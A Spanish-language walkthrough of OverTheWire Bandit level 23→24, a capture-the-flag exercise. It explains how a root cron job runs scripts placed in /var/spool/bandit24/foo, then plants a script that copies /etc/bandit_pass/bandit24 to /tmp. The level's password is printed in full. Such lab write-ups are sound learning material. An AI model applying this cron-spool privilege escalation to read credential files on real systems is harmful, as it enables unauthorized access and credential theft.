# X. Walkthrough Bandit Level 23 → Level 24

Este walkthrough te guía paso a paso para aprovechar el cronjob que ejecuta un script en el sistema y obtener la contraseña del usuario **bandit24**.

---

## 1. Conéctate al Servidor

Inicia sesión en el servidor de Bandit como **bandit23** (usa la contraseña obtenida en el nivel anterior):

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```

---

## 2. Verifica la Existencia del Cronjob

Lista el contenido del directorio de cronjobs para identificar el archivo relevante:

```bash
ls -l /etc/cron.d/
```

Deberías ver, entre otros archivos, **cronjob_bandit24**:

```
-rw-r--r-- 1 root root 120 Sep 19 07:08 cronjob_bandit24
```

Luego, revisa el contenido del archivo:

```bash
head /etc/cron.d/cronjob_bandit24
```

**Salida:**

```
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

*Esto confirma que el script `/usr/bin/cronjob_bandit24.sh` se ejecuta al reiniciar y cada minuto, como el usuario **bandit24**.*

---

## 3. Revisa el Script Ejecutado por Cron

Visualiza el contenido del script para comprender su funcionamiento:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

**Salida:**

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

### Puntos Clave:

- La variable `myname` se define usando `whoami`.  
  *Como el script se ejecuta como **bandit24**, el directorio utilizado es `/var/spool/bandit24/foo`.*

- El script recorre todos los archivos en ese directorio y, **si el archivo es propiedad de bandit23**, lo ejecuta (con un timeout de 60 segundos) y luego lo elimina.

- Aunque no puedes listar el contenido de `/var/spool/bandit24/foo` por permisos, sí puedes escribir en él.

---

## 4. Crear el Script Malicioso

El objetivo es que el cronjob de **bandit24** ejecute un script que copie la contraseña de **bandit24** (ubicada en `/etc/bandit_pass/bandit24`) a un archivo en `/tmp/`.

Desde tu sesión de **bandit23**, crea el script en el directorio `/tmp`:

```bash
echo "cat /etc/bandit_pass/bandit24 > /tmp/certa_test.txt" > /tmp/24.sh
```

Luego, hazlo ejecutable:

```bash
chmod +x /tmp/24.sh
```

*Importante:* Al crear el script de esta forma, aseguras que **bandit23** es el propietario, lo cual es imprescindible para que el cronjob lo ejecute.

---

## 5. Copiar el Script al Directorio de Ejecución del Cronjob

Aunque no puedas listar el contenido de `/var/spool/bandit24/foo`, tienes permisos para escribir en él. Copia el script allí:

```bash
cp /tmp/24.sh /var/spool/bandit24/foo/
```

Con esto, el archivo `/var/spool/bandit24/foo/24.sh` (propiedad de **bandit23**) estará listo para ser ejecutado por el cronjob.

---

## 6. Espera a que Cron Ejecute el Script

El cronjob se ejecuta cada minuto. Espera hasta que se dispare (aproximadamente 60 segundos). Durante la ejecución, el script copiará la contraseña de **bandit24** a `/tmp/certa_test.txt`.

---

## 7. Verifica la Contraseña

Una vez transcurrido el tiempo, comprueba el contenido del archivo generado:

```bash
cat /tmp/certa_test.txt
```

**Salida esperada:**

```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

Esta es la contraseña del usuario **bandit24**.

---

## 8. Conéctate al Siguiente Nivel

Utiliza la contraseña obtenida para acceder a **bandit24**:

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

Cuando se te solicite, ingresa la contraseña `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`.

---

## Consideraciones Finales

- **Exactitud en el Script:**  
  La línea dentro del script debe ser exactamente:
  
  ```bash
  cat /etc/bandit_pass/bandit24 > /tmp/certa_test.txt
  ```
  
  para asegurar que se copia la contraseña correctamente.

- **Permisos y Propietario:**  
  Es fundamental que el script sea propiedad de **bandit23**, ya que el cronjob verifica el propietario antes de ejecutarlo.

- **Directorio con Permisos de Escritura:**  
  Aunque no puedas listar el contenido de `/var/spool/bandit24/foo`, esto no impide que puedas escribir en él.

---

Con estos pasos en formato Markdown, se reproduce exactamente la solución probada y se llega al objetivo de obtener la contraseña del siguiente nivel. ¡Buena suerte en tu avance al nivel 24!